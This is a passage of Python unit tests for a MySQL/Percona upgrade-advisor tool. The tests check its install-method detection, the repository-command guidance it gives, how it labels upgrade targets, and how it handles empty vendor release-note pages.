    def test_percona_command_enables_only_the_target_line(self):
        install = ut.install_method(dict(mysql_layout('8.0.43-34'), version_comment='Percona Server (GPL), Release 34'))
        guidance = ut._guidance('percona', install)
        self.assertEqual(guidance['command'], 'sudo percona-release enable-only {repository} release')
        self.assertIn('module disable mysql', guidance['text'])
        self.assertNotIn('setup', guidance['command'])

    def test_distribution_rpm_is_not_called_oracle_packages(self):
        install = ut.install_method(dict(mysql_layout('8.4.6'), version_comment='Source distribution'))
        self.assertEqual(install['method'], 'distro_rpm')
        self.assertIn('Yum repository instead', ut._guidance('mysql', install)['text'])

    def test_57_to_80_is_the_next_bugfix_series(self):
        report = ut.build_report(mysql_layout('5.7.44'), mysql={'releases': [
            {'version': '8.0.46', 'date': '2026-04-21', 'url': None}]}, shell=None)
        self.assertEqual(report['targets'][0]['path_label'], 'next bugfix series')

    def test_newest_lts_patch_gets_no_innovation_suggestion(self):
        report = ut.build_report(mysql_layout('9.7.4'), mysql={'releases': [
            {'version': '9.7.4', 'date': '2026-10-20', 'url': None},
            {'version': '26.10.0', 'date': '2026-10-20', 'url': None}]}, shell=None)
        self.assertEqual([t['version'] for t in report['targets']], ['26.10.0'])
        self.assertIsNone(report['recommended'])


class EmptyVendorPages(Base):
    """An answer with nothing recognizable in it is not evidence (review gate, 2026-11-08)."""

    def test_an_empty_series_page_is_a_partial_read(self):
        reader = FakeReader(extra={ut.RELNOTES % '8.4': '<html><body></body></html>'})
        report = self.report(mysql_layout('8.0.43'), reader)
        self.assertIn('8.4 release notes page listed no releases', report['source']['error'] or '')
        self.assertFalse([t for t in report['targets'] if t['series'] == '8.4'])

    def test_an_empty_release_page_is_unknown_and_noted(self):
        self.assertEqual(ut.parse_availability(''), 'unknown')
        self.assertEqual(ut.parse_availability('<html><body>Service unavailable</body></html>'), 'unknown')
        reader = FakeReader(extra={NEWS % '8-4-13': ''})
        report = self.report(mysql_layout('8.0.43'), reader)
        self.assertIn('8.4.13', [t['version'] for t in report['targets']])
        self.assertTrue(any('could not be read' in n for n in report['notes']))

